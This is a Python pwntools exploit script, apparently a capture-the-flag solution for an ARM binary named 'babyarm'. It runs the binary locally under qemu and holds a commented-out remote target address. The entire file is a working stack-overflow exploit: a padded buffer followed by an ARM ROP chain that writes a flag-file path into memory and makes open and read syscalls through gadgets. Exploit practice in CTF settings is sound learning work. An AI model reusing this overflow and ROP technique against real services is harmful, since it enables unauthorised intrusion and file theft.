from pwn import *

bin_sh = 0x4b004
bss_addr = 0x00073e80+0x1000
fd_str = 0x00073e80+0x500
'''
0x0001a2e4 (0x0001a2e5): pop {r0, r2, pc};
0x000104a0 (0x000104a1): pop {r7, pc};
0x00010a64 (0x00010a65): svc #0; pop {r7, pc};
0x0001fd74 (0x0001fd75): add r0, r4; pop {r4, pc};
0x00048144 (0x00048145): add r3, r4; blx r3;
0x000103f8 (0x000103f9): pop {r4, pc};
0x00014c28 (0x00014c29): pop {r3, pc};
0x0001e944 (0x0001e945): pop {r0, r1, r2, r3, pc};
0x0001a37c (0x0001a37d): str r3, [r4]; pop {r4, pc};
'-g', '1234',
'''
#p = remote('202.148.27.84', 20002)
p = process(['/usr/sbin/qemu-arm-static','-g', '1234','./babyarm'])
flag = b'/home/ctf/flag.txt'.ljust(20, b'\x00')
payload = b''.join([
    b'A'*(0x20+4),

    # /dev/tty
    p32(0x000103f9), # pop {r4, pc};
    p32(fd_str+(4*0)),
    p32(0x00014c29), # pop {r3, pc};
    b'/dev',
    p32(0x0001a37d), # str r3, [r4]; pop {r4, pc};
    p32(fd_str+(4*1)),
    p32(0x00014c29), # pop {r3, pc};
    b'/tty',
    

    # /hom
    p32(0x0001a37d), # str r3, [r4]; pop {r4, pc};
    p32(bss_addr+(4*0)),
    p32(0x00014c29), # pop {r3, pc};
    flag[(4*0):(4*1)],
    
    # e/ct
    p32(0x0001a37d), # str r3, [r4]; pop {r4, pc};
    p32(bss_addr+(4*1)),
    p32(0x00014c29), # pop {r3, pc};
    flag[(4*1):(4*2)],
    
    # f/fl
    p32(0x0001a37d), # str r3, [r4]; pop {r4, pc};
    p32(bss_addr+(4*2)),
    p32(0x00014c29), # pop {r3, pc};
    flag[(4*2):(4*3)],

    # ag.t
    p32(0x0001a37d), # str r3, [r4]; pop {r4, pc};
    p32(bss_addr+(4*3)),
    p32(0x00014c29), # pop {r3, pc};
    flag[(4*3):(4*4)],

    # xt\x00\x00
    p32(0x0001a37d), # str r3, [r4]; pop {r4, pc};
    p32(bss_addr+(4*4)),
    p32(0x00014c29), # pop {r3, pc};
    flag[(4*4):(4*5)],
    p32(0x0001a37d), # str r3, [r4]; pop {r4, pc};
    p32(0),

    # open("/home/ctf/flag.txt", 0, 0)
    p32(0x000104a1), # pop {r7, pc};
    p32(0x5),
    p32(0x0001e945), # pop {r0, r1, r2, r3, pc};
    p32(bss_addr),
    p32(0),
    p32(0),
    p32(0x10965),
    p32(0x000103f9), # pop {r4, pc};
    p32(0x100),
    p32(0x00048145), # add r3, r4; blx r3;
    b'C'*4,
    # read(0, bss, 0x20)
    p32(0x000104a1), # pop {r7, pc};
    p32(0x3),
    p32(0x0001e945), # pop {r0, r1, r2, r3, pc};
    p32(0),
    p32(bss_addr+0x100),
    p32(0x20),
    p32(0x10965),
    p32(0x000103f9), # pop {r4, pc};
    p32(0x100),
    p32(0x00048145), # add r3, r4; blx r3;
    b'C'*4,

    # exit
    p32(0x000104a1), # pop {r7, pc};
    p32(0x1),

    p32(0x0001e945), # pop {r0, r1, r2, r3, pc};
    p32(22),
    p32(2),
    p32(0),
    p32(0x10965),

    p32(0x000103f9), # pop {r4, pc};
    p32(0x100),

    p32(0x00048145), # add r3, r4; blx r3;
    b'C'*4,
])
print(p.recv(11))
p.sendline(payload)
p.interactive()

